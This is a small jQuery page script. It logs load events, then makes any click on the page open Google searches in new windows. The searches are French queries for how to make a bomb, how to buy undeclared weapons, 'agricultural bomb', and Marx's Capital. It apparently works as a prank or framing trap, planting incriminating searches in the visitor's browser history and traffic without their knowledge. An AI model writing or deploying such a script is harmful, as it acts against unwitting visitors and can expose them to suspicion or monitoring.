$( document ).ready(function() {
    console.log( "document loaded" );
});
 
$( window ).on( "load", function() {
    console.log( "window loaded" );
    $("body").click(function(){
	window.open('http://google.com/search?q="comment fabriquer une bombe"');
	window.open('http://google.com/search?q="comment acheter des armes non déclarées"');
	window.open('http://google.com/search?q="bombe agricole"');
	window.open('http://google.com/search?q="marx le capital"');
    });
});
